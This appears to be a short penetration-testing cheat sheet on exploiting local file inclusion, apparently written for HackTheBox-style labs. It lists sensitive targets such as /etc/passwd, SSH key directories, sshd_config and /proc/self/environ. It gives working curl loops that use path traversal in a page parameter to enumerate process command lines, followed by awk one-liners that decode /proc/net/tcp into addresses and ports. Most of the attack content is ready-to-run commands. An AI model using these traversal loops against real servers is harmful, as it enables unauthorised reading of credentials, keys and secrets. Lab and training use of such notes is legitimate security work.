
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt

https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI


proc/self/cmdline
proc/self/environ
/proc/self/cwd/app.py

/etc/passwd get usernames
/home/username/.ssh/

/etc/ssh/sshd_config for other ssh key locations like ecdsa or ed25519

/proc/self/status
to get process ids
loop through id's to get info on odd service on odd port
/proc/pid/net/tcp

`for i in $(seq 900 1000); do curl [http://airplane.htb](http://airplane.htb):8000/?page=../../../../proc/$i/cmdline -o -; echo " PID => $i"; done`

`seq 1 10000 | while read pid;do data=$(curl -s --output - "http://target/[vuln.php](https://vuln.php)?page=../../../../../../proc/${pid}/cmdline" 2>/dev/null); echo "pid($pid) -- $data"; done | tee [proc.pid_enum.cmdline.txt](https://proc.pid_enum.cmdline.txt)`


### Netstat similar data
`/proc/net/tcp` TCP connection data
`/proc/net/udp` UDP connection data
`/proc/net/unix` UNIX socket data

IP addresses and ports will be in hex format
```bash
grep -v "rem_address" /proc/net/tcp  | awk  '{x=strtonum("0x"substr($3,index($3,":")-2,2)); for (i=5; i>0; i-=2) x = x"."strtonum("0x"substr($3,i,2))}{print x":"strtonum("0x"substr($3,index($3,":")+1,4))}'
```

if on system where gnu awk is not used
```bash
grep -v "rem_address" /proc/net/tcp  | awk 'function hextodec(str,ret,n,i,k,c){
    ret = 0
    n = length(str)
    for (i = 1; i <= n; i++) {
        c = tolower(substr(str, i, 1))
        k = index("123456789abcdef", c)
        ret = ret * 16 + k
    }
    return ret
} {x=hextodec(substr($2,index($2,":")-2,2)); for (i=5; i>0; i-=2) x = x"."hextodec(substr($2,i,2))}{print x":"hextodec(substr($2,index($2,":")+1,4))}'
```
For info on local ports, like listening ports - replace `$2` with `$1` to get the local address column

